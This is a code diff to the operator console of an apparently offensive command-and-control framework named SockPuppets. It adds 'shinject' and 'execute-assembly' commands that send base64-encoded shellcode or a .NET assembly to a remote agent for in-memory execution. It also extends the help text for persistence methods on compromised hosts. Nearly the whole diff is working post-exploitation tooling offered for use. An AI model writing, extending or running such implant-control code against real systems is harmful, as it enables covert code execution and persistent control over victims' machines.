@@ -410,8 +410,10 @@ class SockPuppetsCLI(cmd.Cmd):
         print("[*] Type 'dormant <hours>' to put agent into dormancy")
         print("[*] Type 'upload <local_path> <remote_path>' to upload a file")
         print("[*] Type 'download <remote_path>' to download a file")
-        print("[*] Type 'persist <method>' to install persistence (run/schtask)")
+        print("[*] Type 'persist <method>' to install persistence (run/registry/schtask/remove)")
         print("[*] Type 'screenshot' to capture a screenshot")
+        print("[*] Type 'shinject <path>' to inject shellcode from a .bin file")
+        print("[*] Type 'execute-assembly <path> [args]' to run a .NET assembly in memory")
         print("[*] Type 'upgrade' to switch to streaming mode")
         print("[*] Type 'downgrade [seconds]' to switch to beacon mode")
         if self.server.agents.get(agent_id) and self.server.agents[agent_id].is_http():
@@ -527,6 +529,84 @@ class SockPuppetsCLI(cmd.Cmd):
                             print(result)
                         except Exception as e:
                             print(f"[-] BOF error: {str(e)}")
+                        continue
+
+                    if command.lower().startswith('shinject '):
+                        parts = command.split(None, 1)
+                        if len(parts) < 2:
+                            print("[-] Usage: shinject <path-to-shellcode-bin>")
+                            continue
+
+                        sc_path = parts[1]
+                        if not os.path.exists(sc_path):
+                            print(f"[-] Shellcode file not found: {sc_path}")
+                            continue
+
+                        try:
+                            import base64 as b64mod
+                            with open(sc_path, 'rb') as f:
+                                sc_data = b64mod.b64encode(f.read()).decode()
+
+                            print(f"[*] Injecting shellcode: {os.path.basename(sc_path)}")
+                            sc_cmd = f"__shinject:{sc_data}"
+
+                            current_agent_info = self.server.agents.get(agent_id)
+                            if current_agent_info and current_agent_info.mode == 'beacon':
+                                print(f"[*] Waiting for beacon to check in...")
+                                timeout = 65
+                            else:
+                                timeout = 65
+
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, sc_cmd),
+                                self.loop
+                            )
+                            result = future.result(timeout=timeout)
+                            print(result)
+                        except Exception as e:
+                            print(f"[-] Shellcode injection error: {str(e)}")
+                        continue
+
+                    if command.lower().startswith('execute-assembly '):
+                        parts = command.split(None, 1)
+                        if len(parts) < 2:
+                            print("[-] Usage: execute-assembly <path-to-.exe> [args...]")
+                            continue
+
+                        asm_args_raw = parts[1].split()
+                        asm_path = asm_args_raw[0]
+                        asm_cli_args = ' '.join(asm_args_raw[1:]) if len(asm_args_raw) > 1 else ''
+
+                        if not os.path.exists(asm_path):
+                            print(f"[-] Assembly file not found: {asm_path}")
+                            continue
+
+                        try:
+                            import base64 as b64mod
+                            with open(asm_path, 'rb') as f:
+                                asm_data = b64mod.b64encode(f.read()).decode()
+
+                            print(f"[*] Loading assembly: {os.path.basename(asm_path)}")
+                            if asm_cli_args:
+                                print(f"[*] Args: {asm_cli_args}")
+
+                            asm_cmd = f"__asm:{asm_cli_args}:{asm_data}"
+
+                            current_agent_info = self.server.agents.get(agent_id)
+                            if current_agent_info and current_agent_info.mode == 'beacon':
+                                print(f"[*] Waiting for beacon to check in...")
+                                timeout = 65
+                            else:
+                                timeout = 65
+
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.send_command_to_agent(agent_id, asm_cmd),
+                                self.loop
+                            )
+                            result = future.result(timeout=timeout)
+                            print(result)
+                        except Exception as e:
+                            print(f"[-] Assembly error: {str(e)}")
                         continue
 
                     if command.lower() == 'results':
